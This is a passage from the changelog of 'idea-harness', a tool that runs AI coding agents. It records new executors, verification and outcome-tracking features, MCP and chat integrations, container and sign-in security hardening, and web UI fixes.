  unchanged. Runs are durable in a new `remote_runs` table (migration 40): a deterministic idempotency key per
  (task, attempt) and a conversation id derived from it make a retry after a crash re-attach
  instead of starting twice; events are ingested from the stored cursor exactly once into a
  compact, redacted progress log for the live view; a daemon restart re-attaches to runs still
  going (shutdown no longer stops them), catches up and follows them to the end; a finished run is
  collected by the task's next `idea execute`; a vanished conversation fails with that reason;
  `idea cancel` interrupts the run on the server and keeps what the agent wrote. Transient errors
  retry with backoff. Configured with `idea executors setup --kind openhands --url … [--agent acp
  --acp-command …] [--smoke] --yes` (probes the server and session key), checked by `idea doctor`,
  listed by `GET /executors`, writable through `PUT /executors` (`openhands_url`,
  `openhands_api_key_env`, `openhands_agent`, `openhands_acp_command`) and smoke-testable from
  Settings. `auto` never picks it. Targets openhands-agent-server v1.54.0; tested against a fake
  Agent Server and, for the protocol, against the real image with no LLM key — no real model has
  edited files through it yet, so every combination is reported untested until `--smoke` passes.

- **Verification beyond unit tests: quality dimensions with evidence.** `idea verify` now measures
  seven dimensions of the applied work — `setup_reproducibility` (the documented setup/build/test
  commands run in a fresh copy in the no-network sandbox), `docs_completeness`,
  `api_compatibility` (a focused OpenAPI 3 diff and a Go exported-API diff; unacknowledged breaking
  changes fail), `api_ergonomics` (a verification_engineer model review whose findings count only
  when they cite a diff line), `security` (credential re-scan, deny-check summary, configured
  scanners), `performance` (declared budgets compared with the previous measurement) and
  `operational_readiness` — each a result of cited checks marked deterministic or model-reviewed,
  recorded in the product record (`quality_results`, migration 41) and linked to requirements with `verifies` edges (`idea why
  quality_result …`, `idea impact requirement …`). Unmeasured is reported as `not_measured`, never as
  a pass. Policy is `verify.dimensions` in harness.yaml (`off` | `advisory` | `gate`); defaults
  follow `review.rigor` — **`quick` measures nothing; `standard` makes setup, docs and API
  compatibility advisory; `thorough` gates those three** (see Changed — BREAKING). New `GET`/`POST /api/v1/projects/{projectId}/initiatives/{id}/quality`
  (read; 202 measure), `quality` on the verify response, `idea verify --no-measure`, a scorecard on
  the Health and Build pages, and the opt-in `verify.setup.prepare` / scanner `network: true` —
  the only sandboxed commands ever given network ([security model](docs/security-model.md#execution-gateway)).
  See [configuration](docs/configuration.md#quality-dimensions-verify).

- **Objectives & outcomes: the chain now runs Objective → Hypothesis → Requirement → … → Evidence →
  product outcome.** Verification proves a requirement was built; it cannot say whether building it
  mattered. The README's [Objectives & outcomes](README.md#objectives--outcomes) section has the
  model and the exact drift rules.
  - **Model.** `Objective` (`OBJ-n`; active/achieved/abandoned; optional owner) and
    `OutcomeMetric` (`MET-n`; direction increase/decrease/maintain, optional baseline and guardrail,
    target, cadence, and a `manual`, `command` or `url` source), and `MetricObservation` (value,
    time, source, note, provenance, and the change sets attributed to it). New graph edges:
    `requirement --serves--> objective` (N:M), `metric --measures--> objective`,
    `assertion --predicts--> metric` for a hypothesis, and `metric --attributed_to--> change_set`.
    Migration 42 (three tables: `objectives`, `outcome_metrics`, `metric_observations`).
  - **PRD stage.** The PRD states objectives and metrics; codes stay stable across revisions like
    `REQ` codes, and a human-added objective is never rewritten or superseded by a revision. The
    PRD review's deterministic checks raise a high finding for a requirement serving no objective
    and for an objective with no measurable metric (one medium finding when a PRD has no objectives
    at all); the adversarial reviewer sees the objectives and may cite `OBJ-n`/`MET-n` under the
    convergence citation rules.
  - **Measurement.** `idea metric record` for a human's value; `idea metric measure` runs `command`
    sources in the no-network check sandbox (workspace read-only at `/repo`, never the host) and
    fetches `url` sources through the SSRF-guarded fetcher, only once the new
    `outcomes.allow_url_sources` opts in. New `harness.yaml` section `outcomes:` (`image`,
    `measure_timeout_seconds`, `allow_url_sources`).
  - **Drift.** Deterministic `off_track` / `stale` / `regressed` / `no_data` / `on_track`, and the
    "works, but fails its objective" signal for a verified requirement whose objective is failing —
    on `idea status`, `idea next`, guidance, the Health page and the Define page. An observation
    that moves a metric into `off_track` or `regressed` publishes the new integration event
    `outcome.drifted` (Slack posts it by default).
  - **Surfaces.** CLI: `idea objectives`, `idea objective add|edit|link`, `idea metrics`,
    `idea metric add|edit|record|measure`. API: `…/objectives`, `…/objectives/{objectiveId}`,
    `…/objectives/{objectiveId}/requirements`, `…/metrics`, `…/metrics/measure`,
    `…/metrics/{metricId}`, `…/metrics/{metricId}/observations`, `…/outcomes`. MCP: read tools
    `list_objectives` and `list_metrics`, judgment tool `record_metric`.
  - **For graph-gap analysis.** Read-only store queries `ObjectivesWithoutMetrics`,
    `ObjectivesWithoutRequirements`, `RequirementsWithoutObjectives`, `DriftingMetrics` and
    `RequirementOutcomeDrift` — all views of one rule, `domain.AnalyzeOutcomeChain`, which the
    outcome report (`GET …/outcomes`, the Health page), `idea gaps` and the PRD review's outcome
    checks now share. A requirement counts as serving an objective only if that objective is
    *active* (not achieved or abandoned), as the review already required; the outcome report's
    `requirements_without_objectives` is now gated on an active objective existing (it was any
    non-superseded one), and `objectives_without_metrics` counts only measurable metrics.

- **Signed, attested release artifacts with SBOMs and a Homebrew cask** (deferred.md, audit 7 /
  K4). The release job now signs `checksums.txt` with keyless cosign (Sigstore, the workflow's
  GitHub OIDC identity), records a GitHub build-provenance attestation for every archive, ships an
  SPDX SBOM per archive generated by syft, and publishes a cask to `devarispbrown/homebrew-tap` so
  `brew install devarispbrown/tap/idea-harness` works once the repository is public.
  [RELEASING.md](RELEASING.md) has the verification commands.

- **`idea mcp`: an MCP server, so Claude Code, Cursor, Codex or any Model Context Protocol client
  can drive idea-harness.** A stdio server (`claude mcp add idea -- idea mcp`) that is a client of
  the daemon like every other command — it auto-starts the daemon, uses the CLI's token, never
  opens the state database, and is subject to every gate the daemon enforces. Twenty-six tools:
  reads (`list_initiatives`, `status`, `next_step`, `show_prd`, `list_tasks`, `list_findings`,
  `list_questions`, `list_decisions`, `why`, `impact`, `trace`, `gaps`, `list_objectives`,
  `list_metrics`, `changed`, `list_change_sets`, `show_change_set`, `get_operation`), judgments
  (`new_initiative`, `answer_question`, `resolve_decision`, `review_change_set`, `record_metric`,
  `verify`) and, only with `--allow-apply`,
  `apply_change_set` and `revert_change_set`. `--read-only` exposes the reads alone. Each tool has
  a JSON Schema for its arguments and `readOnlyHint`/`destructiveHint` annotations, and answers
  with concise text plus `structuredContent`. Artifacts are readable as
  `idea://initiative/{id}/{kind}` resources. Daemon refusals come back as `isError` tool results
  carrying the daemon's message; malformed requests are JSON-RPC errors. Speaks the `2026-07-28`
  protocol revision and the `initialize`-handshake revisions back to `2024-11-05`. See
  [`docs/mcp.md`](docs/mcp.md).

- **`acp` executor kind: any Agent Client Protocol agent as the coding agent.** Claude Code
  (`claude-code-acp`), Codex (`codex-acp`), Gemini CLI (`gemini --experimental-acp`), OpenHands
  (`openhands acp`), OpenCode — anything speaking ACP's JSON-RPC over stdio. The agent runs in
  the same hardened container as hermes/omp (`docker run -i`), and idea-harness is its ACP client:
  `initialize` advertising only `fs.readTextFile`/`fs.writeTextFile` (never `terminal`),
  `session/new` with `cwd: /work`, `session/prompt` with the brief, success on `end_turn`. File
  reads/writes are confined to the work root (cleaned and symlink-resolved; escapes answer
  `-32602`). Permission requests are auto-answered `allow_once` — the container is the boundary —
  and each is recorded on the run manifest. A prompt turn is bounded by
  `executor.acp.timeout_seconds` (default 840 s) and ends with `session/cancel`, then a kill.
  Configure with `executor.image`, `executor.acp.command` (argv inside the image; `{model}` and
  `{bare_model}` substituted), optionally `executor.acp.key_env`; or
  `idea executors setup --kind acp --image <img> --acp-command <argv> [--acp-key-env NAME]`, which
  verifies the image with a keyless, network-less ACP `initialize` handshake. `--smoke`, the
  Build page smoke test and `PUT /executors` (`acp_command`, `acp_key_env`) support it; the compat
  table reports every `acp` combination as untested until one is smoke-verified.
- **`executor.mcp_servers`: MCP pass-through for ACP agents**, in ACP's `McpServer` shape (stdio
  `command`/`args`/`env`, or `type: http|sse` with `url`/`headers`). Values are a literal `value`
  or a `value_env` naming a variable resolved like provider keys (daemon environment, then `.env`);
  a literal that looks like a secret is refused at load, a `value_env` set nowhere stops the run
  before the container starts, and resolved values are redacted from agent output. See
  `docs/agents.md` for the trust tradeoff (stdio servers run inside the agent's container).
- **Executor provenance on the run manifest**: `executor.requested`/`resolved`/`image`/`warning`
  and, for ACP, `executor.permissions` (new `run_manifests.executor_json` column, migration 37).
- **`executor_resolution` on the Build page guidance and `GET /executors`**, and
  `executor_resolved`/`executor_warning` on `POST …/execute`, so every client can say which
  executor a run uses and when it writes no real code. `idea doctor` prints it (`⚠ executor: …` for
  the fallback, as a warning that does not fail the command).

- **`idea eval`** — the first measurement this project has. It runs a fixed suite of seven small
  greenfield ideas end to end on a private in-process daemon (idea → PRD review → plan → change set
  → apply → verify) with an automatic judgment policy (`--policy approve|stop`), and reports per
  case and in aggregate: stage reached, PRD/plan review convergence and cycles, human-judgment stops
  and where, change sets produced and applied, verification, cost, tokens, wall time, and every
  review cycle's convergence record — as markdown, and as JSON with `--json-out`. `--baseline`
  compares against a saved report and exits non-zero on a regression. Without `--model` it runs a
  deterministic scripted provider whose scenarios include the measured non-convergence (a reviewer
  re-raising rephrased findings, run under both the guarded and the legacy loop) and a genuine
  blocker that must still park for a human; that run is a Go test, so CI gates on it against
  `internal/eval/testdata/baseline-scripted.json`. With `--model` it measures a real provider.
  Acceptance checks are skipped (and reported as skipped) under the placeholder internal executor.
- `daemon.Runtime.RegisterProvider` and `daemon.Runtime.InitiativeRunStats` (Go-only, no HTTP
  route): the hooks `idea eval` uses to put a scripted provider behind the real registry and to read
  token usage and review telemetry. `store.SumRunUsage` sums an initiative's run usage.
- **Convergence telemetry on the run manifest.** Each adversarial review run's manifest records the
  cycle: findings raised, new, re-raised and resolved by severity; what each rule demoted; the open
  blocking count before and after; and the outcome (`converged`, `revise`, `stalled`, `max_cycles`,
  `blocked`). Stored in `run_manifests.review_json` (migration 38); `store.ListReviewTelemetry`
  reads an initiative's history.
- `schema.Review` findings accept optional `requirement`, `reraises` and `justification`;
  `schema.PRD` accepts optional `review_responses`.

- **Slack and Linear integrations** ([docs/integrations.md](docs/integrations.md)), configured under
  `integrations:` in `harness.yaml`, tokens from the environment or `.env` only. Neither needs a
  public URL.
  - **An integration event bus.** A per-project dispatcher tails the event log (the source the SSE
    endpoint streams) into typed events — initiative created, needs judgment with its reason,
    PRD/plan approved, change set started/ready/approved/rejected/applied/reverted, verify
    passed/failed, run failed, task status — and delivers them through a SQLite outbox
    (migration 39): per-subscriber cursor, unique idempotency key, in-order delivery, exponential
    backoff honouring `Retry-After`, and dead-lettering after 8 attempts. A restart resumes without
    re-posting; enabling an integration does not post history; the engine never waits on it.
  - **Slack.** Block Kit notifications threaded per initiative, `needs_judgment` broadcast with
    configurable mentions; over Socket Mode, **Approve/Reject** buttons on change sets ready for
    review, **Accept recommendations** and per-question **Answer** on judgment items, and
    `/idea new <idea>` / `/idea status`. Every action goes through the daemon's own HTTP handler, so
    it meets the same gates and gets the same refusals as the CLI, and only users in
    `integrations.slack.allowed_users` may act (empty, the default, is notify-only). App manifest:
    [docs/integrations/slack-manifest.yaml](docs/integrations/slack-manifest.yaml).
  - **Linear.** An approved execution plan becomes a parent issue plus one sub-issue per task
    (requirement codes, why-chain), kept in step with change sets and task status, with comments
    for reviews, applies, reverts and verification. Issues carrying the inbound label (default
    `idea`) become initiatives, with the issue text attached as an untrusted context document, never
    as the description. A Linear-side cancellation records an `initiative.external_note` and changes
    nothing.
  - `idea integrations [status]`, `idea integrations test slack|linear`, an integrations summary in
    `idea doctor` (reported, not failing), `GET /projects/{projectId}/integrations`,
    `POST /projects/{projectId}/integrations/{name}/test`, and **Settings → Integrations** in the UI.
- The redactor's catalog now covers Slack app-level tokens (`xapp-…`) and Linear API keys
  (`lin_api_…`), and integration tokens are fed to it by their configured env names.

### Security

- **A root daemon no longer runs root containers.** When the daemon runs as uid 0, every
  container it starts — coding agents of every kind, the `container` executor, deterministic
  checks, verify's quality dimensions, metric commands and the setup probes — runs as a fixed
  unprivileged `65532:65532` instead of root. The work root and agent home are chowned to that
  user for the run (symlinks never followed) and back afterwards, so the engine sees ordinary
  daemon-owned files. Non-root daemons are unchanged. Closes the audit 3 / S6 deferred item;
  details and what is left in `docs/security-model.md` (Execution gateway).
- **A root daemon runs containers as the project's owner.** Under a root daemon, agents, the
  `container` executor, checks, quality dimensions and metric commands now run as the uid:gid that
  owns the project root, so a check can read the owner's `0600` files in `/repo` and nothing left
  behind is owned by root. `65532:65532` remains the fallback when the project root is owned by
  root, and for the setup probes; gid `0` is never passed. Non-root daemons are unchanged.
- **A killed root daemon's work roots are handed back at the next start.** Once the startup sweep
  has removed every leftover container, a root daemon chowns foreign-owned files in
  `<state>/projects/*/work/` back to itself and deletes leftover quality-dimension copies and
  metric-command scratch roots. Nothing outside those directories is touched. Metric commands
  now use a scratch root under the project's state directory (`metric-*`) instead of the system
  temp directory, and wait for the startup sweep before they run. Check containers now carry the agent label, so the sweep
  also removes a check a killed daemon left running.
- **Nobody can lock the owner out of remote sign-in.** Wrong pairing codes were counted
  daemon-wide: ten in fifteen minutes from anyone paused sign-in for everyone and cancelled every
  outstanding code. A later version kept a global ceiling of 100 as a backstop, which anyone with
  ten addresses could still spend to pause sign-in for everyone. Now there is no daemon-wide lock.
  Each client has its own budget (10 per 15 minutes; only that client is refused). Each pairing
  code has its own: every wrong code counts against each code outstanding at that moment, and a
  code that reaches 100 is burned — it can never be redeemed, and typing it says so. A code minted
  afterwards (`idea ui pair`, on the daemon's machine) starts at zero and works at once. A code is
  50 bits, so one code is guessed with probability at most 100/2⁵⁰ ≈ 8.9×10⁻¹⁴ — the same per-code
  exposure the old ceiling gave — and the counts are in `global.db` (migration 3), so a restart no
  longer resets them. Burns are reported: `idea ui pair`, `idea ui sessions` and Settings → Remote
  access show how many codes burned in the last 7 days and when (`burned_codes`,
  `last_burned_at` on `POST /ui/pairing-codes` and `GET /ui/sessions`), and the daemon log warns.
  A request from the daemon's own machine is never counted or refused, and signed-in sessions are
  never affected. A client is the peer address (IPv6 by /64); proxy headers
  (`Tailscale-User-Login`, the rightmost `X-Forwarded-For` entry) are believed only through a
  loopback proxy answering to an `allowed_hosts` name, so a header cannot buy a fresh budget. The
  session list's address and default label use the same rule (they used to believe
  `X-Forwarded-For` on any loopback connection). The `429` now carries
  an accurate `Retry-After`. Design and code-space arithmetic: `docs/security-model.md` (Remote
  access).
- **A remote execution plane is a trust boundary, and the harness treats it as one.** For
  `openhands`, the server URL must be `https` unless loopback and carry no credentials (refused at
  config load, by `PUT /executors`, by setup and before every dispatch); the session key is read
  from the variable `executor.openhands.api_key_env` names, never stored, and sent in a header or
  the websocket's first frame, never a URL; both keys are stripped from everything stored from the
  server's events. What leaves the machine — the seeded work root, the brief, the provider key
  unless `withhold_provider_key` — is listed in
  [docs/security-model.md](docs/security-model.md#the-remote-execution-plane-openhands). The
  downloaded archive is untrusted input: escaping paths, links, devices and control-plane entries
  are skipped and size caps apply before anything is mirrored into the work root. The trust tier
  `remote_external` now grants `read_file`/`write_file` to that kind; an unknown executor kind no
  longer borrows `remote_external` but gets no tier at all, so it stays fail-closed. `GET
  /executors` reports the new `sandbox_mode: remote`.

- **The daemon log is redacted.** It was the one persisted surface the redaction
  choke point did not reach, and `GET /api/v1/logs` served it verbatim (deferred
  since audit 3 / S4). The daemon's `slog` handler is now wrapped so the message
  and every attribute value — errors, nested groups, attributes bound with
  `With`, and a value whose key names a credential (`"password", "…"`) — pass
  through the credential catalog plus every loaded project's secret values and
  the daemon's API token before reaching `daemon.log`. The handler is also the
  process default, so `slog.Default()` callers and `net/http`'s error log go
  through it. `GET /api/v1/logs` redacts each line again on read, which covers
  log files written before this release and raw stderr (a panic trace).
- **`raw-blobs/` stays unredacted, and is now documented and locked down as
  such.** Apply writes from it and revert restores from it, both keyed on the
  digest of the real bytes, so masking it would write `[REDACTED]` into source
  files. `docs/security-model.md` now states exactly what it holds, what can be
  unmasked in it, and every reader (all API surfaces over it redact, except the
  image-doc download). `blob.New` re-tightens an existing store directory to
  `0700`; blobs were already `0600`.
- **A vision description is redacted even with no redactor wired.** It already
  went through the project redactor and the redacting blob store; an engine
  built without a redactor now falls back to the pattern catalog instead of
  relying on which store is wired. New tests pin that an OCR'd key never
  reaches the stored description or a prompt, that a `.docx` carrying a key is
  rejected on its extracted text, and that a key in an image's filename is
  masked in its title.
- **`pii`, `path_escape` and `trust_deny` are produced.** All three were
  declared in `DenyCode` with no code path emitting them.
  - `pii`: Execute scans produced files for payment card numbers (issuer
    prefix and length, printed grouping, Luhn, published test numbers
    excluded) and dashed US SSNs (issued ranges, published examples excluded).
    A match raises a coded, blocking finding with a masked preview — not a
    reject — that `--accept-findings` never covers; a human dispositions it
    `accepted_risk` individually. Advisory in test/fixture paths. Emails and
    phone numbers are deliberately not detected.
  - `path_escape`: apply refuses, before writing anything, a change whose path
    is absolute, unclean, or resolves outside the workspace or into
    `.git/`/`.idea-harness/` through a symlink. The change set is rejected and
    its task reopened. A symlink into the control plane previously passed the
    lexical control-plane check.
  - `trust_deny`: the executor `write_file` trust gate now refuses with a
    `workflow.SystemDenyError` carrying the code. No shipped executor kind
    trips it; it is the fail-closed backstop for a kind with no trust mapping.
- **Changes to auto-executing files need an explicit sign-off.** A change set
  touching CI definitions (`.github/workflows/`, `.gitlab-ci.yml`,
  `.circleci/`, `Jenkinsfile`, …), tree-installed git hooks (`.husky/`,
  `.pre-commit-config.yaml`, …) or `.envrc`/`.devcontainer/`/
  `.vscode/tasks.json` gets one blocking `protected_path` finding. It is not a
  deny, since an initiative may be about CI: a plain `approve` is refused and
  `idea review <CHG-n> approve --accept-findings` records the human sign-off.
  Build files (`Makefile`, `package.json`, …) are deliberately left off.

- **The default Hermes image is pinned by digest**, and `executor.PullImage` refuses a pulled
  image whose `RepoDigests` do not contain the pinned digest for that repository — for the default
  and for any `--image` given as `repo[:tag]@sha256:…`. Signature verification is still not done
  (recorded in `docs/plans/deferred.md`).
- **The `acp` kind forwards secrets without an env-file**: the provider key and MCP `value_env`
  values are passed as `-e NAME` with the value in the docker CLI's own environment, never in argv;
  MCP values reach the agent in `session/new` on its stdin.

### Fixed

- `POST .../tasks/reorder`'s two count/permutation refusals, and
  `POST .../findings/{id}/disposition`'s disposition-value and
  `not_a_secret`-scoping refusals, carried a literal `store: ` prefix into the
  client body — the same leak `ErrSelfMerge`/`ErrMergeCycle`/
  `ErrDependsOnCycle` were fixed for in 0.6.0, reachable for the first time now
  that `idea reorder` and `idea disposition` exist to hit them from the CLI
  (`internal/store/graph.go`, `internal/store/repo.go`).

- **The sidebar's Settings button was off screen in demo mode.** The demo banner pushed a
  full-height sidebar down by its own height, so in a short window the footer (Settings,
  Automations, Remote runs) sat below the screen until the page scrolled. On a wide screen the
  banner now stays at the top and the sidebar fills the window under it, at the top of the page and
  scrolled; an e2e test checks both.

- **Content cut off at the edge of the screen, and a tall phone top bar.** A sweep of every route
  at 390px and 1280px in both colour schemes (`web/e2e/views.e2e.ts`) found: Automations' "Reports
  are written to <path>" ran past a phone's edge and was clipped (`html`/`body` clip horizontal
  overflow, so it could not even be scrolled to); lineage's Full trace table grew to ~1550px at
  1280 because a node label inside it never wraps; and the top bar on Home, Settings, Automations
  and Needs you stacked Automations above Settings in a column, leaving a tall empty band. Long
  strings now wrap in those places and the top bar's links sit in a row.
- **Every route has exactly one `h1`.** Settings had none, so a route change focused its first
  section ("Model") as if that were the page; it now opens with a "Settings" h1. The document
  reader had none of its own and turned every `#` line of a document into another h1: the
  document's title is now the page's h1 and its headings render one level down. A decision's
  "Discussion" label is its h1. Gaps, Outcomes, Quality and lineage under an unknown initiative
  rendered their own page beside "Initiative not found"; they render only the not-found page now.
- **The page behind a modal was still reachable.** The command palette and the `?` reference set
  `aria-modal` and trapped Tab, but a screen reader's virtual cursor (and a pointer) could still
  reach the page under them. They now render into `<body>` and make the app root `inert` while
  open, restoring it on close; the live region sits outside it so announcements are still heard.
  The browser suite's axe check of an open dialog now covers the whole page instead of the dialog
  alone.
- **An agent run's end was announced twice.** A run that went live and ended inside one poll (the
  demo executor's, or one failing on its first call), and a stopped run's panel catching up, put
  "Agent run started." and "Executing the plan finished." (or "stopped.") into the live region
  back to back. The two now share a topic in `announce.ts`: held briefly, only the more specific
  operation message is said, and a late less-specific echo is dropped.
- **Dark mode failed WCAG AA contrast on every page.** White text on the dark scheme's light indigo
  accent (the logo, primary buttons, the plan bar's action) was 3:1; done phases in the sidebar,
  the commit bar's explanation and several secondary lines used a hard-coded `#57534e` (2.1:1 on
  the dark surface); `DEC-n`/`OBJ-n` chips used a hard-coded `#4338ca` (1.8:1). New tokens
  (`--accent-fill`, `--on-accent`, `--text-secondary`, `--accent-strong`) carry them in both
  schemes. Also: the "Needs you elsewhere" count was white on amber (2.1:1, both schemes); a
  resolved judgment card faded its text with `opacity` (4.1–4.4:1); the deny chip and the phase
  dot were literal white in dark mode.
- **A stray merge marker in `styles.css`** (`=======`) made the browser drop the rule after it —
  the run panel's own container style.
- **A stopped run's tool calls no longer stay "in progress".** When a run ends — Stop, a failure, a
  timeout, or an agent that never reported a call's end — every tool call still pending or in
  progress gets a harness `tool_result` with `status: cancelled` on the same `tool_call_id`, so the
  run panel and the run report show it as ended. The run panel reads such a call **cancelled** (⊘),
  counts it as done in "n/m actions" with "· n cancelled", and closes any open call itself once the
  run is over (a run recorded before this, or a result that was dropped).
- **The PRD names objectives by their codes.** A model (and the demo provider) keys a new objective
  `O1`, and `idea prd` / the document reader printed `O1: …` and `Serves: O1` — a label nothing else
  uses. The PRD body is now rendered after the objectives are stored, with `OBJ-n` in both places.
  The PRD artifact is also committed after its requirements, objectives and questions, rather than
  before them.
- **Web UI review fixes.** Build: the change-set chip reads the status (an applied demo change set is
  `APPLIED` with a `DEMO` marker, not "PLACEHOLDER CHANGE (DEMO)"); "Approve, accepting *n*
  findings" appears only when the reviewer left open blocking findings; "Starting TASK-1…" no longer
  outlives the change set; the run note is a labelled field and the failed-run banner's Retry takes
  a note too. Plan: the pill says "approved" on every viewport and the bar stays (pointing at Build)
  once a change set exists. Verify: Pass/Fail are not shown under the note saying they are locked.
  Settings: the executor kind shows what `harness.yaml` asks for (`auto`) and what it resolves to;
  no "pinned default image is pulled" for `internal`; a ready provider in demo mode reads "ready ·
  not selected"; the model-list status stays in the Model card instead of an unprompted key error
  at the bottom; one demo banner, not two. Navigation: **Activity** opens the What changed
  timeline, Explore's **trace** opens the document's lineage route, and Health has its own link.
  Define: "Accept all recommendations" says what it did and that questions are never answered for
  you (and is not offered when only questions are open); answered questions stay, with their
  answer, under Resolved. Every initiative route renders "Initiative not found" for an unknown id,
  and a bad decision id renders "Decision not found" instead of an empty thread with a Send box.

- **A plan revision that changed nothing minted "v2" and renumbered every task.** Every regenerated
  document started a new artifact family at v1, so Plan offered "Diff v1 → v1" (which the diff
  endpoint then refused: different artifacts), and revise-plan recreated every task through the
  monotonic task counter, turning TASK-1 into TASK-2. A regenerated design document or plan is now
  the next version of the same artifact and an identical one records nothing; a regenerated task
  that kept its title keeps its code. A revised PRD is likewise v2 of the PRD, not a second v1.
- **The What changed panel showed raw event names** (`stale.cleared`, `tasks.deleted`,
  `change_set.status_changed`, category `Change_set`). Every event type now narrates as words.

- **Answered questions reached the model as "(answer not found)".** The answer
  text is written to the redacted store and was read back from the raw one,
  which in the daemon is a different directory; tests wired one store as both.
  Found auditing every `raw-blobs/` read path.


## [0.6.0] - 2026-09-21

### Changed — BREAKING

| Was | Now |
|---|---|
| `projection.BuildGuidance(ini, understanding)` | `projection.BuildGuidance(ini, understanding, recentChangeSets)` — an internal Go API, not an HTTP contract; the daemon's own caller is the only one affected and is updated. Pass `nil` for the old behavior. |
| `workflow.similarJudgment`'s near-duplicate threshold: overlap-over-shorter-side ≥ 0.6 | token-Jaccard similarity ≥ 0.85 after normalization (review B4, adopted #8) — a stricter, more accurate measure; some previously-merged near-duplicates (e.g. two decisions sharing only a couple of common words) now stay distinct. |
| `DELETE .../tasks/{taskId}` on a task with dependents: `{"error":"another task depends on this task; remove that dependency first"}` | `{"error":"TASK-1 cannot be deleted: TASK-3, TASK-4 depend on it. Remove those dependencies first, or delete them too."}` — still a 409 with the same JSON error shape, now naming the dependents. |
| Adding or editing a task with no requirement reference succeeded silently | `POST`/`PATCH` task now **requires** naming at least one requirement (`requirement_ids`, merged with the single `implements` field); a task may now implement more than one requirement (N:M) via `CreateTaskMulti`. |
| A vocabulary marker (`password`, `token`, `secret`, `auth`, and similar words) anywhere in a patch hard-blocked the change set, with no file, no line, and no way past it | Raises a non-blocking `sensitive_area` finding instead; only a real credential value still blocks. |
| Approving a change set whose adversarial review never ran (the run was stopped during the review) succeeded, and applying it shipped code no reviewer had seen | `POST .../change-sets/{id}/review` with `approved`, `--accept-findings` and apply all refuse while `review_completed_at` is unset, naming `idea review <id> rerun` (a fresh, paid review) as the way forward. A change set created before this release predates review tracking and says so rather than claiming it was cancelled. |
| `idea verify --json` exited 0 even when the verification gate was unmet, so it could not gate a script (the human-readable form already exited non-zero) | Both forms exit non-zero on an unmet gate. `--json` still prints the same payload on stdout; the human message goes to stderr. |

### Added

- **The CLI judgment loop.** `internal/cli` had no caller for
  `POST …/questions/{id}/answer` or `POST …/decisions/{id}/resolve` — an
  evaluator had to reach past the CLI into raw HTTP to answer a question or
  resolve a decision, though `idea decisions` lists them and guidance says
  "Resolve open decisions". New commands: `idea questions` (lists them, with
  a short id-prefix reference since questions have no human code),
  `idea answer <question> "<answer>"`, `idea resolve <decision>
  <option#>|"<resolution>"` (an option can be named by its 1-based index or by
  free text), `idea reopen-decision <decision>` (the reopen route existed with
  no CLI caller either), `idea accept-recommendations` (the daemon's own batch
  escape, review B4/#8), and `idea triage` (its ranked view). Guidance's
  "Resolve open decisions"/"Resolve open questions" now name the commands
  that actually do it.
- **`idea model` filtering.** The bare command printed every model of every
  configured provider (~8k tokens on a real run) with no way to see less.
  `idea model` now shows the current selection plus a curated set (5) of each
  provider's models by default, with a hint naming the escapes:
  `idea model list --all` (every model of every provider, the old behaviour)
  and `idea model list <provider>` / `idea model --provider <name>` (one
  provider in full).
- **`--wait`, opt-in on `advance`/`execute`/`apply`/`revert`.** These return a
  handle immediately while `idea new` blocks and streams progress by
  default — a real inconsistency, but flipping `idea new`'s own default would
  reopen the race its own doc comment describes fixing (the README's quick
  start: the very next command used to see the initiative still `running`).
  Both defaults stay, and the vocabulary is **not** uniform across commands:
  `advance`/`execute`/`apply`/`revert` accept only `--wait` (opt into
  blocking, since they return a handle by default); `retry`/`reopen-phase`
  accept only `--no-wait` (opt out of blocking, since they wait by default,
  same as `idea new`); `idea new` alone accepts both spellings (`--wait`
  restates its own default as a no-op, `--no-wait` opts out of it). A command
  not named above does not accept either flag.

- **A human can disposition a `secret_sweep` finding `not_a_secret`.** This
  allowlists the finding's fingerprint (a per-project HMAC of the matched
  value's capture group, never the value) for the project, with the actor and time
  recorded; the sweep ignores an allowlisted fingerprint from then on, at both
  Execute and Apply. `GET /api/v1/projects/{projectId}/secret-allowlist` lists
  entries (fingerprint prefix, kind, path at the time, actor, created_at);
  `DELETE …/secret-allowlist/{id}` revokes one.
- **Revert refuses to erase an edit made after apply** (review A3). An ICP
  user's comment added to a file after apply was silently erased by a revert
  that never checked the workspace. `RevertChangeSet` now compares every
  touched file against the change set's post-image before writing anything —
  the mirror of apply's own pre-image check (`fsdiff.StaleBase`) — and refuses,
  naming the files, if any changed: `revert refused: the workspace changed
  since CHG-3 was applied: src/app.js: it was edited in the workspace after
  apply; commit or discard your edits to src/app.js, then revert`. No `--force`
  option. `POST …/change-sets/{id}/revert` answers a synchronous `409`
  (`fsdiff.StalePost`, `Engine.RevertBlockedReason`) instead of starting an
  operation that can only fail in the background.
- **`git_commit` guards** (review C4, adopted #2). The commit-on-apply path now refuses — and
  records why as `git_commit_warning` on the change set, leaving the apply itself to succeed exactly
  as it would with `git_commit` off — when HEAD is detached, a rebase/merge/cherry-pick is in
  progress, or the current branch is the repository's default branch and `git.allow_default_branch`
  is not set. Hooks stay disabled for every agent commit either way (unchanged, now documented in
  `docs/configuration.md`). `git.allow_default_branch` (new config field).
- **`git.branch_per_initiative`** (opt-in, C4 piece 2). An initiative's first apply creates and
  checks out `idea/<slug-of-its-title>`; every later change set for that initiative commits to the
  same branch (`initiative.git_branch`, new API field), never whatever was checked out before. If
  the workspace has uncommitted changes outside the change set's own files, the branch switch — and
  so the commit — is skipped, with a warning, rather than carrying an unrelated edit onto a new
  branch.
- **`idea pr`** (C4 piece 3). Pushes an initiative's dedicated branch and opens a pull request via
  `gh pr create`, with a body built from the initiative (PRD summary, change sets, verification
  progress); idempotent (`initiative.pr_url`, new API field). `idea pr checks <change-set-id>` shows
  the latest CI status via `gh pr checks` (`GET …/change-sets/{id}/pr-checks`). A missing `gh`
  answers a clear 409 rather than an opaque exec error.
- **The check sandbox image is derived from the project's toolchain** when `check.image` is not
  configured (review C5): `.nvmrc`/`package.json` `engines.node` → `node:<major>`, `go.mod`'s `go`
  directive → `golang:<ver>`, `.python-version` → `python:<ver>`. Only when detection is
  unambiguous — a version range, a non-numeric tag, or more than one recognized toolchain still
  fails closed exactly as an unconfigured image always has. The image (derived or configured) is
  shown on every build/test check finding.

- **`review.rigor: auto|quick|standard|thorough`** (new `harness.yaml` field,
  default `auto`). Auto calibrates from a cheap project-size walk (file
  count/LOC, the seed's own ignore rules) and the change size (requirement
  count for the PRD/plan review, file count for the change-set review): a
  small project and a small change get `quick`; a large project or a large
  change gets `thorough`; everything else is `standard`. An unmeasured
  workspace (no workspace yet) is treated as unknown, not small, and never
  auto-selects `quick`. Documented in `docs/configuration.md` ("Review
  rigor"). This is the ICP round's own root cause answered directly: a
  60-line toy app's review loop demanded ABNF grammars and audit schemas and
